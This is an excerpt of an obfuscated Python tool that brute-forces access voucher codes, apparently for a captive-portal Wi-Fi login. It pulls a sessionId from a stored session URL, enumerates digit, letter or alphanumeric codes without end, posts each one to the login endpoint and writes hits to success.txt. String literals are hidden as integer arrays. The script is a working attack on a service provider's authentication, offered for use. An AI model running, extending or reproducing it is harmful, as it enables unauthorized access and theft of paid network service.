...
async def _g_s_i(session, s_u, p_s_i):
    ...
    for _ in range(3):
        try:
            async with session.get(s_u_s, headers=h, timeout=5, allow_redirects=True) as req:
                res = str(req.url)
                s_i = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", res)
                if s_i:
                    return s_i.group(1)
    ...
    try:
        async with session.post(post_url, headers=headers, json=data, timeout=5) as req:
            ...
            if _d([108, 111, 103, 111, 110, 85, 114, 108]) in response_text:
                if not is_recheck:
                    # ✅ SUCCESS code ကို screen ပေါ်တွင် ပြမယ် (အစိမ်းရောင်)
                    print(f"\n{_g_}[ ✔ ] SUCCESS: {voucher}{_w_}", flush=True)
                    with open(_d([115, 117, 99, 99, 101, 115, 115, 46, 116, 120, 116]), "a") as f:
                        f.write(f"{voucher}\n")
                    _G_S_C_ += 1
                return "SUCCESS"
            elif _d([83, 84, 65]) in response_text:
                if not is_recheck:
                    # LIMITED ကို screen ပေါ်မပြချင်ရင် print ဖျက်ထားတယ်
                    with open(_d([115, 117, 99, 99, 101, 115, 115, 46, 116, 120, 116]), "a") as f:
                        f.write(f"{voucher}\n")
                    _G_S_C_ += 1
                return "LIMITED"
...
# =================== INFINITE GENERATOR ===================
def infinite_voucher_generator(mode, length, checked_set):
    while True:
        if mode == "digit":
            chars = string.digits
        ...
        for i in range(n):
            idx = (start_offset + i * step) % n
            temp = idx
            res = []
            for _ in range(length):
                res.append(chars[temp % base])
                temp //= base
            v = "".join(reversed(res))
            if v not in checked_set:
                yield v
        print(f"\n{_y_}[!] Completed one full cycle. Restarting with fresh set...{_w_}")
        checked_set.clear()

class _V_C_:
    def __init__(self, mode, code_length):
        try: 
            self.session_url = open(_d([46, 115, 101, 115, 115, 105, 111, 110, 95, 117, 114, 108]), "r").read().strip()
        except: 
    ...
    async def execute(self):
        ...
        vouchers_iter = infinite_voucher_generator(self.mode, self.code_length, checked_codes)

        print(f"{_g_}[+] Voucher Code searching (infinite mode)...{_w_}")
        ...
        async def ui_updater():
            while not tracker['stop']:
                ...
                print(f"\r{_c_}[ ⚡ ] Speed: {speed:.0f}/s | Checked: {tracker['attempts']} | Found: {_G_S_C_}{_w_}    ", end="", flush=True)
                await asyncio.sleep(0.5)
...
class _R_V_:
    ...
    async def check(self):
        ...
        try:
            s_url = open(_d([46, 115, 101, 115, 115, 105, 111, 110, 95, 117, 114, 108]), "r").read().strip()
        except:
            print(f"{_r_}[!] Please run Setup [1] first.{_w_}")
            time.sleep(2)
            return
    ...
    while True:
        try:
            ...
            if choice == '1':
                ...
                mode_map = {
                    '1': "digit", '2': "ascii-lower", '3': "ascii-upper",
                    '4': "ascii-mix", '5': "alphanumeric"
                }
                if sub_choice not in mode_map:
                    print(f"{_r_}[!] Invalid choice!{_w_}")
                    time.sleep(1)
                    continue
                mode = mode_map[sub_choice]
                ...
                try:
                    ...
                    if getattr(v_obj, 'session_url', None) is not None:
                        try:
                            asyncio.run(v_obj.execute())
                        except RuntimeError as e:
                            if "already running" in str(e):
                                loop = asyncio.get_event_loop()
                                loop.run_until_complete(v_obj.execute())
                            else:
                                print(f"{_r_}[!] Async Runtime Error: {e}{_w_}")
                                time.sleep(2)
                        except KeyboardInterrupt:
                            print(f"\n{_y_}[*] Brute force interrupted.{_w_}")
                except KeyboardInterrupt:
                    continue
